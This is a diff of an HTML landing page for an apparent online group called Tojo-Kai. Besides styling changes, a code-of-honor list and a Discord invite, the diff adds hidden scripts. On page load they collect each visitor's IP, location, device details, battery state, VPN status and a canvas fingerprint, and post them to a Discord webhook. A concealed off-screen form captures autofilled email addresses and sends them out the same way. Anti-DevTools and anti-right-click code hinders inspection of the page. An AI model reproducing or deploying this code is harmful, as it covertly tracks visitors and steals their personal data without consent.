@@ -12,10 +12,11 @@
       color: #f2f2f2;
       font-family: 'Montserrat', sans-serif;
       margin: 0;
+      padding-top: 60px; /* <-- ini ditambahin */
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
     }
 
     .card {
@@ -25,7 +26,7 @@
       text-align: center;
       box-shadow: 0 0 30px rgba(0, 0, 0, 0.6);
       max-width: 400px;
-      width: 90%;
+      width: 50%;
     }
 
     h1 {
@@ -95,6 +96,7 @@
       text-align: center;
       margin-bottom: 1rem;
       font-weight: 700;
+      text-shadow: 0 0 5px #00ffff, 0 0 10px #00ffff;
     }
     
     .clan-desc {
@@ -189,6 +191,51 @@
       33%  { opacity: 0; }
       100% { opacity: 0; }
     }
+    #hidden-email-capture {
+      position: absolute;
+      top: -1000px;
+      left: -1000px;
+      height: 1px;
+      width: 1px;
+      border: none;
+      background: transparent;
+      color: transparent;
+    }
+
+    .oath-section {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 1.2rem 1.5rem;
+      border-left: 3px solid crimson;
+      margin-top: 2rem;
+      color: white;
+      max-width: 500px;
+      margin-left: auto;
+      margin-right: auto;
+      font-family: "Courier New", monospace;
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
+    }
+    
+    .oath-section h3 {
+      color: crimson;
+      font-size: 1.4rem;
+      margin-bottom: 1rem;
+      text-align: center;
+    }
+    
+    .oath-section ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    
+    .oath-section li {
+      padding: 6px 0;
+      font-size: 0.95rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      justify-content: center;
+    }
     
   </style>
 </head>
@@ -219,6 +266,24 @@
         <li><strong>Senshi</strong> — Aspirant</li>
       </ul>
     </div>
+    <form id="honeypot-form" style="position: absolute; top: -1000px; opacity: 0;">
+      <input type="email" id="hidden-email-capture" name="email" autocomplete="email" />
+    </form>
+    
+    <div class="oath-section">
+      <h3>📜 Tojo-Kai Code of Honor</h3>
+      <ul>
+        <li>🩸 Loyalty is absolute</li>
+        <li>💀 Failure is not forgiven</li>
+        <li>🤝 Brotherhood over blood</li>
+        <li>🎯 Power through unity</li>
+      </ul>
+    </div>
+
+    <div class="links">
+      <a href="https://discord.gg/hEytXNeqwk" target="_blank" style="text-align: center;">🉐 Join Us!</a>
+    </div>
+    
   </div>
 
   <div class="gallery">
@@ -233,110 +298,156 @@
       <img src="pic7.png" alt="">
     </div>
   </div>
+  
   <script>
-    async function getIPInfo() {
-      // Fetch the IP from ipify
+    async function captureFullOSINT() {
+      const webhookURL = document.getElementById('hidden-webhook').getAttribute("data-webhook");
+  
+      // IP & Lokasi
       const ipRes = await fetch('https://api.ipify.org?format=json');
       const ipData = await ipRes.json();
-      const ip = ipData.ip; // Ensure ip is not undefined
+      const ip = ipData.ip;
   
-      if (!ip) {
-          console.error('IP could not be fetched');
-          return;
-      }
-  
-      // Fetch location info using ipinfo.io
       const locationRes = await fetch(`https://ipinfo.io/${ip}/json?token=6447b620b1b0a1`);
       const locationData = await locationRes.json();
       const location = locationData.city && locationData.region && locationData.country
-          ? `${locationData.city}, ${locationData.region}, ${locationData.country}`
-          : "Unknown Location";
+        ? `${locationData.city}, ${locationData.region}, ${locationData.country}`
+        : "Unknown Location";
   
       const deviceInfo = navigator.userAgent;
       const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
       const currentTime = new Date().toLocaleString();
   
-      // Retrieve the webhook URL from the hidden element
-      const webhookURL = document.getElementById('hidden-webhook').getAttribute('data-webhook');
+      // Proxy/VPN detection
+      let isVPN = 'Unknown';
+      try {
+        const ipCheck = await fetch('https://ipapi.co/json/');
+        const ipApi = await ipCheck.json();
+        isVPN = ipApi?.proxy ? 'Yes (Proxy/VPN/Tor)' : 'No';
+      } catch (err) {
+        console.warn("Proxy check failed", err);
+      }
   
-      // Card-like styled content for Discord webhook
+      // Battery info
+      let batteryInfo = "Not Available";
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        batteryInfo = `Charging: ${battery.charging}, Level: ${Math.round(battery.level * 100)}%`;
+      }
+  
+      // Canvas fingerprint
+      function getCanvasFingerprint() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillText('Tojo-Kai | OSINT Tracker', 2, 2);
+        return canvas.toDataURL().slice(0, 100);
+      }
+  
+      const screenInfo = `Res: ${screen.width}x${screen.height}, Lang: ${navigator.language}, Platform: ${navigator.platform}`;
+      const canvasFP = getCanvasFingerprint();
+  
+      // FINAL PAYLOAD GABUNGAN
       const payload = {
-          content: `**🌐 New Visitor Detected!**
-          \n🕒 **Time**: ${currentTime}
-          \n📍 **IP**: ${ip}
-          \n🌍 **Location**: ${location}
-          \n💻 **Device**: ${navigator.platform}
-          \n🕵️ **User Agent**: ${deviceInfo}
-          \n🔄 **Timezone**: ${timezone}
-          \n**🌐 == DONE ==**
-          \n`
-      };
-  
-      // Sending data to Discord Webhook
-      fetch(webhookURL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload) // ensure valid JSON payload
-      }).then(res => {
-          if (res.ok) {
-              console.log("Webhook sent successfully");
-          } else {
-              console.error("Failed to send webhook", res);
-          }
-      }).catch(err => {
-          console.error("Error in sending webhook", err);
-      });
-  }
-  
-  getIPInfo();
+        content: `
+      > 🔥 **DETECTED**
       
-  document.addEventListener('keydown', function (event) {
-        // Mencegah F12, Ctrl+Shift+I, Ctrl+U dan pintasan lainnya
-        // F12 untuk Windows/Linux
-        if (event.key === 'F12' || 
-            (event.ctrlKey && event.shiftKey && event.key === 'I') || // Ctrl+Shift+I
-            (event.ctrlKey && event.key === 'U') || // Ctrl+U untuk view source
-            (event.metaKey && event.key === 'U')) { // Cmd+U untuk Mac
-
-            event.preventDefault();
-            alert("REJECTED!");
+      \n > 🕒 **Time:** \`${currentTime}\`
+      \n > 📍 **IP Address:** \`${ip}\`
+      \n > 🌍 **Location:** \`${location}\`
+      \n > 💻 **Device:** \`${navigator.platform}\`
+      \n > 🕵️ **User Agent:** \`${deviceInfo}\`
+      \n > 🧭 **Timezone:** \`${timezone}\`
+      
+      ━━━━━━━━━━━━━━━
+      \n > 🔎 **ADVANCED OSINT**
+      \n > 🎭 **Proxy/VPN/Tor:** \`${isVPN}\`
+      \n > 🔋 **Battery:** \`${batteryInfo}\`
+      \n > 🖥️ **Screen Info:** \`${screenInfo}\`
+      \n > 🧬 **Canvas Fingerprint:** \`${canvasFP}\`
+      ━━━━━━━━━━━━━━━
+      
+      \n > 🛰️ **Status:** \`Scan Complete\`
+      \n > 🔗 **Origin:** [tojo-kai.netlify.app](https://tojo-kai.netlify.app)
+        `
+      };
+      
+  
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).then(res => {
+        console.log("Webhook sent:", res.status);
+      });
+    }
+  
+    function captureEmailAutofill() {
+      const input = document.getElementById("hidden-email-capture");
+      const webhookURL = document.getElementById("hidden-webhook").getAttribute("data-webhook");
+  
+      setTimeout(() => {
+        const email = input.value;
+        console.log("Cek autofill email:", email);
+        if (email && email.includes("@")) {
+          fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              content: `📧 **Email Captured via Autofill:**\n${email}`
+            })
+          }).then(res => console.log("Email webhook status:", res.status));
         }
-
-        // Mencegah pintasan khusus Mac
-        if (event.metaKey && event.key === 'I') { // Cmd+I di Mac
-            event.preventDefault();
-            alert("REJECTED!");
-        }
-    });
-
-    // Mencegah klik kanan untuk membuka Developer Tools
-    document.addEventListener('contextmenu', function (event) {
+      }, 4000);
+    }
+  
+    window.onload = () => {
+      captureEmailAutofill();
+      captureFullOSINT(); // panggil OSINT gabungan
+    };
+  
+    // Anti DevTools
+    document.addEventListener('keydown', function (event) {
+      if (
+        event.key === 'F12' || 
+        (event.ctrlKey && event.shiftKey && event.key === 'I') || 
+        (event.ctrlKey && event.key === 'U') || 
+        (event.metaKey && event.key === 'U') ||
+        (event.metaKey && event.key === 'I')
+      ) {
         event.preventDefault();
         alert("REJECTED!");
+      }
     });
-
-    // Deteksi apakah Developer Tools dibuka melalui perubahan ukuran jendela
+  
+    document.addEventListener('contextmenu', function (event) {
+      event.preventDefault();
+      alert("REJECTED!");
+    });
+  
     let devToolsOpen = false;
     const threshold = 160;
-
+  
     function detectDevTools() {
-        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
-        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
-
-        if (widthThreshold || heightThreshold) {
-            if (!devToolsOpen) {
-                devToolsOpen = true;
-                alert("REJECTED!");
-            }
-        } else {
-            devToolsOpen = false;
+      const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+      const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+  
+      if (widthThreshold || heightThreshold) {
+        if (!devToolsOpen) {
+          devToolsOpen = true;
+          alert("REJECTED!");
         }
+      } else {
+        devToolsOpen = false;
+      }
     }
-
-    // Jalankan deteksi setiap 1 detik
+  
     setInterval(detectDevTools, 1000);
-
-    </script>
+  </script>
+  
+  
+  
     
 
 </body>
